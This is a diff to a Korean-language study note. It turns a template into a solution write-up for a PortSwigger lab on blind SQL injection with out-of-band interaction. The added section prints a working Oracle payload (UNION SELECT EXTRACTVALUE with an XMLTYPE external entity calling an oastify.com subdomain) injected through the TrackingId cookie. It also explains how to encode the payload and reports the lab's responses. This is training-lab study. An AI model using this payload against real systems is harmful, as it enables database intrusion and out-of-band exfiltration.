@@ -5,7 +5,8 @@ tags:
   - sql-injection
 lab_url: "https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band"
 difficulty: Practitioner
-note_kind: problem
+note_kind: solution
+draft: false
 ---
 
 # Blind SQL injection with out-of-band interaction
@@ -28,20 +29,32 @@ note_kind: problem
 
 ## 탐색 및 풀이 기록
 
-<!-- 아직 이 실습의 쿠키 요청이나 Burp Collaborator DNS 이벤트를 직접 기록하지 않았다. 웹 응답과 외부 이벤트를 혼동하지 않고 확인 결과를 같은 파일에 이어서 적는다. -->
-
 ### 초기 관찰
-<!-- 직접 확인한 내용과 아직 확인하지 못한 점 -->
+
+입력 지점은 상품 페이지 요청의 `TrackingId` 쿠키였다. 원래 쿠키로 요청했을 때 HTTP 200, 본문 3719자가 반환됐고 실습은 미완료 상태였다. 외부 조회 대상에는 PortSwigger 공개 Collaborator 서버의 `*.oastify.com` 아래에 임의로 만든 고유한 하위 도메인을 사용했다. 이 주소는 Burp 클라이언트에서 발급받은 페이로드가 아니므로, 해당 클라이언트로 DNS 이벤트를 직접 조회할 수는 없었다.
 
 ### 실행 과정
-<!-- 무엇을 왜 했는지 → 실제 결과 → 해석 -->
-<!-- 필요할 때 코드·요청·응답·스크린샷 첨부 -->
+
+`TrackingId` 값 뒤에 `UNION SELECT`를 붙이고, Oracle의 `XMLTYPE`과 `EXTRACTVALUE`가 외부 엔티티의 URL을 처리하도록 구성했다. 상품 페이지 경로와 `productId`는 그대로 두고 쿠키에만 주입했다. 아래의 `<고유값>`은 실습 중 생성한 임의 문자열이다.
+
+~~~sql fragment
+<원래 TrackingId>' UNION SELECT EXTRACTVALUE(
+  XMLTYPE('<?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://<고유값>.oastify.com/"> %remote;]>'),
+  '/l'
+) FROM dual--
+~~~
+
+PowerShell에서는 이 값을 `Cookie` 헤더의 `TrackingId`에 넣어 요청했다. 쿠키 구분자와 충돌하지 않도록 페이로드의 `%`, `;`, 공백, `:`, `?`, `=`를 인코딩한 뒤 전송했다. 주입 요청 직후의 결과는 정상 요청과 같은 **HTTP 200, 본문 3719자, 미완료**였다. 3초 뒤 원래 쿠키로 다시 요청하자 **HTTP 200, 본문 6812자**와 실습 완료 배너가 나타났다.
 
 ## 최종 결과
-<!-- 완료 여부와 확인 근거 -->
+
+페이지에 `Congratulations, you solved the lab!` 배너가 표시돼 완료를 확인했다. Collaborator의 DNS 이벤트 로그는 직접 조회하지 못했다. 이 기록에서 직접 관찰한 것은 완료 상태의 변화이며, DNS 조회가 성공했다는 판단은 실습의 완료 조건과 그 상태 변화에 근거한다.
 
 ## 배운 점
-<!-- 새로 알게 된 내용, 잘못 생각했던 부분 -->
+
+비동기식 조회에서는 주입 직후 웹 응답이 정상 응답과 같아도 외부 상호작용이 나중에 일어날 수 있다. 이 실습에서는 공개 Collaborator 도메인의 임의 하위 도메인으로 완료 조건을 충족했지만, DNS 이벤트 자체를 확인하려면 Burp Collaborator가 발급한 주소와 해당 클라이언트의 이벤트 조회가 필요하다.
 
 ## 관련 개념
-<!-- 필요한 개념 노트 링크를 목록으로 추가 -->
+
+- [SQL 기초와 SQL 인젝션이 생기는 원리](../../concepts/sql-injection-foundations.md)
